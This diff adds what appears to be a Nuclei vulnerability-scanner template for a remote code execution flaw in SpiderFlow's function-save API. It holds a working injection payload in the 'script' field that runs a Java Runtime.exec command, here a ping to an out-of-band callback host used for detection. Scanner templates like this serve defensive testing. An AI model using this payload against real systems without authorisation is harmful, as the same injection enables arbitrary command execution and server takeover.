@@ -1,0 +1,36 @@
+id: spiderflow-save-api-rce
+info:
+  name: SpiderFlow Save API RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SpiderFlow has a remote code execution vulnerability. An attacker can execute arbitrary code by adding a custom function to gain server permissions.
+  reference:
+    - https://github.com/ssssssss-team/spider-flow
+    - https://fofa.info
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+
+variables:
+  random_name: "{{rand_base(6)}}"
+  random_check: "{{rand_base(4)}}"
+
+http:
+  - raw:
+      - |
+        POST /function/save HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        id=&name={{random_name}}&parameter=&script=%7DJava.type(%22java.lang.Runtime%22).getRuntime().exec('ping+-c+1+{{interactsh-url}}')%3B%7B
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "200"
+        part: status
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
